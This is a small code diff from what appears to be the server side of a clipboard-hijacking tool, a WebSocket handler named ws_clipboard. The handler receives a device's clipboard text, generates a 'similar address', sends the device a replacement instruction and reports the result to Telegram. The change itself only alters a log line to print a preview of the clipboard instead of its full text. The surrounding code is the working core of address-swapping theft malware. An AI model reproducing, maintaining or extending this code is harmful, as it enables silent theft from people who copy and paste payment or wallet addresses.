@@ -714,7 +714,7 @@ async def ws_clipboard(ws: WebSocket):
                                             "reason": f"[自动生成] 已生成相似地址"
                                         }
                                         await ws.send_text(json.dumps(mutation_response))
-                                        print(f"[AUTO-GENERATE] device={device_id} 已发送替换指令: {clip_text} -> {result['generated_address']}", flush=True)
+                                        print(f"[AUTO-GENERATE] device={device_id} 已发送替换指令: {preview} -> {result['generated_address']}", flush=True)
                                         
                                         # 发送生成结果到Telegram
                                         message = (
